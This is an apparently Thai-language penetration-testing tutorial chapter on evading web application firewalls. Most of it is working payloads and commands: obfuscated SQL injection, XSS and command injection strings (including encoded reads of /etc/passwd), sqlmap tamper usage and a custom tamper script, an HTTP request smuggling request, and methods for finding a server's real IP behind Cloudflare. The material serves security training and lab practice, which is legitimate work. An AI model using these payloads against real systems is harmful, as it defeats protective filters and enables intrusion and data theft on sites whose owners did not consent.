# Part 42: WAF Bypass - เทคนิคหลบ Web Application Firewall

## สารบัญ
1. [ทำความเข้าใจ WAF](#1)
2. [WAF Detection](#2)
3. [SQLi WAF Bypass](#3)
4. [XSS WAF Bypass](#4)
5. [Command Injection WAF Bypass](#5)
6. [HTTP Request Smuggling](#6)
7. [Encoding Techniques](#7)
8. [Tools for WAF Bypass](#8)
9. [Lab Exercises](#9)

---

## 1. ทำความเข้าใจ WAF

```
WAF Types:
- Cloud: Cloudflare, AWS WAF, Akamai
- Commercial: F5, Imperva, Barracuda
- Open Source: ModSecurity, NAXSI

WAF checks:
- SQL injection patterns
- XSS payloads
- Path traversal
- Command injection
- Scanner signatures
```

---

## 2. WAF Detection

```bash
# wafw00f - detect WAF
wget https://github.com/EnableSecurity/wafw00f
pip3 install wafw00f

wafw00f http://target.com
# Output:
# The site http://target.com is behind Cloudflare (Cloudflare Inc.) WAF.

wafw00f -a http://target.com  # ทดสอบทุก WAF
wafw00f -l  # ไล่ WAF ที่รองรับ

# nmap WAF detection
nmap --script http-waf-detect target.com
nmap --script http-waf-fingerprint target.com

# Manual detection
# ส่ง malicious request และดู response
curl -s 'http://target.com/?id=1 OR 1=1' | head -50
# 403 Forbidden = WAF blocking
# Response body: "Request blocked" = WAF

# Cloudflare detection
curl -s -I http://target.com | grep -i cloudflare
# server: cloudflare
# cf-ray: ...
```

---

## 3. SQLi WAF Bypass

```bash
# Classic SQLi ที่ถูก block
# ?id=1 UNION SELECT 1,2,3-- -

# Bypass techniques:

# 1. Case variation
# ?id=1 uNiOn sElEcT 1,2,3-- -

# 2. Comments
# ?id=1 UNION/**/SELECT/**/1,2,3-- -
# ?id=1 UNION/*!SELECT*/1,2,3-- -
# ?id=1 UNION/*!50000SELECT*/1,2,3-- -

# 3. URL encoding
# ?id=1%20UNION%20SELECT%201,2,3--%20-
# ?id=1%09UNION%09SELECT%091,2,3--%09-  (tab)

# 4. Double encoding
# %20 = space -> %2520 (double)
# ?id=1%2520UNION%2520SELECT%25201,2,3

# 5. Unicode/HTML encoding
# SPACE: %20, %09, %0a, %0d, %0b
# ?id=1%0aUNION%0aSELECT%0a1,2,3

# 6. Alternative syntax
# MySQL: version() -> @@version -> @@global.version
# ?id=1 UNION SELECT @@version,2,3-- -

# 7. Inline comments
# ?id=1 /*!UNION*/ /*!SELECT*/ 1,2,3

# 8. HTTP Parameter Pollution
# ?id=1&id=2 UNION SELECT 1,2,3

# sqlmap WAF bypass
sqlmap -u 'http://target.com/?id=1' \
  --tamper=space2comment,randomcase,charunicodeescape \
  --random-agent \
  --delay=2

# Tamper scripts:
ls /usr/share/sqlmap/tamper/
# apostrophemask.py    - ' -> %EF%BC%87
# base64encode.py      - encode payload
# between.py           - replace > with BETWEEN
# bluecoat.py          - add fake HTTP header
# chardoubleencode.py  - double encode
# charunicodeescape.py - unicode escape
# equaltolike.py       - = to LIKE
# halfversionedmorekeywords.py
# htmlencode.py
# ifnull2ifisnull.py
# modsecurityversioned.py
# multiplespaces.py    - add spaces
# randomcase.py        - random CASE
# space2comment.py     - space to /***/
# space2dash.py
# space2hash.py
# space2mssqlhash.py
# unionalltounion.py
# unmagicquotes.py
```

### SQLi Bypass Examples

```sql
-- WAF blocks: UNION SELECT
-- Bypass with comments
1 UNION/**/SELECT/**/1,2,3

-- WAF blocks: SELECT * FROM users
-- Bypass with case
SELECT * fRoM uSeRs

-- WAF blocks keywords
-- Use equivalents:
SELECT -> SEL/**/ECT
OR 1=1 -> || 1=1
AND -> &&

-- MySQL specific
1 /*!UNION*/ /*!SELECT*/ 1,2,3

-- MSSQL specific  
1; EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116))
```

---

## 4. XSS WAF Bypass

```html
<!-- Classic XSS blocked by WAF -->
<!-- <script>alert(1)</script> -->

<!-- Bypass techniques: -->

<!-- 1. Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 2. HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- 3. JavaScript events -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert`1`">
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 4. Protocol handlers -->
<a href="javascript:alert(1)">click</a>
<a href="jAvAsCrIpT:alert(1)">click</a>

<!-- 5. String concatenation -->
<img src=x onerror="ale"+"rt(1)">
<img src=x onerror=eval('ale'+'rt(1)')>

<!-- 6. Encoding -->
<!-- eval(atob('base64_encoded_payload')) -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<!-- atob('YWxlcnQoMSk=') = 'alert(1)' -->

<!-- 7. Template literals -->
<script>alert`1`</script>

<!-- 8. Filter bypass with comments -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- 9. Alternate tags -->
<math><mtext></mtext><mglyph><svg><mtext><textarea><a title="</textarea><img src onerror=alert(1)>"></a></mtext>

<!-- 10. Mutation XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"

<!-- 11. DOM Clobbering -->
<form id=x><input name=location value=javascript:alert(1)></form>
```

---

## 5. Command Injection WAF Bypass

```bash
# Classic command injection blocked
# ; ls /etc/passwd

# Bypass:

# 1. Alternative separators
# %0a (newline)
# %0d%0a (CRLF)
# %26 (&)
# %7c (|)

# 2. IFS (Internal Field Separator) bypass
cmd=l$IFS's'
ls$IFS/etc/passwd

# 3. No space needed
cat</etc/passwd
{cat,/etc/passwd}

# 4. String concatenation
c'at' /etc/passwd
ca''t /etc/passwd
ca""t /etc/passwd

# 5. Environment variables
echo $PATH  # /usr/local/sbin:/usr/local/bin:...
${PATH:14:1}  # 'b' (character from PATH)

# 6. Wildcard expansion
/etc/pass?d   -> /etc/passwd
/???/pa?swd   -> /etc/passwd
/bin/c?t /etc/passwd

# 7. Brace expansion
{l,s}  -> ls
/b{in,in}/cat

# 8. Hex/Octal encoding
echo -e '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
$(echo -e '\x63\x61\x74' /etc/passwd)  # cat

# 9. Base64
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
# cat /etc/passwd

# 10. Reverse command
echo 'dwssap/cte/' | rev  # /etc/passwd -> need adjust
```

---

## 6. HTTP Request Smuggling

```
HTTP Request Smuggling:
- Frontend (WAF/LB) และ Backend ตีความแตกต่างกัน
- Content-Length vs Transfer-Encoding discrepancy

Type CL.TE (Frontend uses Content-Length, Backend uses TE):
- Frontend: request 1 ends at Content-Length
- Backend: sees chunked data = leftover = start of next request
```

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggle_test
0

GET /admin HTTP/1.1
X-Ignore: X
```

```bash
# เครื่องมือ
pip3 install smuggler
python3 smuggler.py -u http://target.com

# Burp Suite Extension: HTTP Request Smuggler
```

---

## 7. Encoding Techniques

```bash
# URL Encoding
# ' = %27
# " = %22
# < = %3C
# > = %3E
# = = %3D
# space = %20

# Double URL Encoding
# % = %25
# %27 = %2527 (double)

# HTML Encoding
# ' = &#39; or &apos;
# < = &lt; or &#60;
# > = &gt; or &#62;
# " = &quot; or &#34;
# & = &amp;

# Unicode Bypass
# SELECT = SELECT

# Shellcode-style hex
curl 'http://target.com/?id=1%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%201,2,3'
# 1 UNION SELECT 1,2,3

# Python helper
python3 << 'EOF'
text = 'UNION SELECT'
url_encoded = ''.join([f'%{ord(c):02X}' for c in text])
print(url_encoded)
# %55%4E%49%4F%4E%20%53%45%4C%45%43%54
EOF
```

---

## 8. Tools for WAF Bypass

```bash
# 1. sqlmap with tamper
sqlmap -u 'http://target.com/?id=1' \
  --tamper=space2comment,randomcase \
  --level=5 --risk=3

# 2. Bypass Cloudflare
# หา real IP ของ server ก่อน
curl -s https://api.hackertarget.com/dnslookup/?q=target.com
# Historical DNS: SecurityTrails, Shodan

# 3. WAFNinja
git clone https://github.com/khalilbijjou/WAFNinja
python3 WAFNinja/wafninja.py bypass -u 'http://target.com/?id=FUZZ' -t sql

# 4. FTW (Framework for Testing WAFs)
pip3 install ftw
ftw run --ruleset /path/to/rules/ --url http://target.com

# 5. Custom tamper script for sqlmap
cat > custom_tamper.py << 'EOF'
#!/usr/bin/env python3
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """Custom tamper: replace spaces with /**/ and add random comments"""
    result = payload
    result = result.replace(' ', '/**/')  # space -> comment
    return result
EOF

sqlmap -u 'http://target.com/?id=1' --tamper=custom_tamper.py

# 6. Bypass with HTTP/2
# HTTP/2 header injection for WAF bypass
curl --http2 'http://target.com/?id=1 UNION SELECT 1,2,3'
```

---

## 9. Lab Exercises

### Lab 1: SQLi WAF Bypass

```bash
# Setup DVWA with ModSecurity WAF

# Test normal SQLi
curl 'http://target.com/vulnerabilities/sqli/?id=1 UNION SELECT 1,2--&Submit=Submit'
# 403 Forbidden

# Bypass with tamper
sqlmap -u 'http://target.com/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=xxx; security=high' \
  --tamper=space2comment,randomcase,between \
  --dbs --level=3
```

### Lab 2: XSS WAF Bypass

```bash
# Test with different payloads
# Normal: <script>alert(1)</script> -> blocked

# Test bypass
curl -s 'http://target.com/search?q=<img+src=x+onerror=alert(1)>' | grep -i 'alert'
curl -s 'http://target.com/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'

# XSS Hunter - find blind XSS bypass
# Use: <img src=x onerror="eval(atob('BASE64_CALLBACK'))">
```

### Lab 3: Cloudflare Bypass

```bash
# หา origin IP
# 1. Historical DNS
curl 'https://viewdns.info/iphistory/?domain=target.com'

# 2. Shodan
curl 'https://api.shodan.io/shodan/host/search?key=API_KEY&query=hostname:target.com'

# 3. SSL cert
curl 'https://crt.sh/?q=%.target.com&output=json' | python3 -m json.tool

# 4. เชื่อมต่อ origin โดยตรง
curl -H 'Host: target.com' http://ORIGIN_IP/
```

---

## สรุป

| เทคนิค | ใช้กับ | ตัวอย่าง |
|---------|-------|----------|
| Case variation | SQLi, XSS | uNiOn SeLeCt |
| Comments | SQLi | UNION/**/ SELECT |
| URL encoding | All | %27, %20 |
| Double encoding | All | %2527 |
| Events | XSS | onerror, onload |
| IFS | CMDi | cmd$IFS ls |
| Tamper scripts | SQLi | sqlmap --tamper |
| wafw00f | Detection | wafw00f target |

---

**ต่อไป:** [Part 43 - Social Engineering](Part-43-Social-Engineering.md)
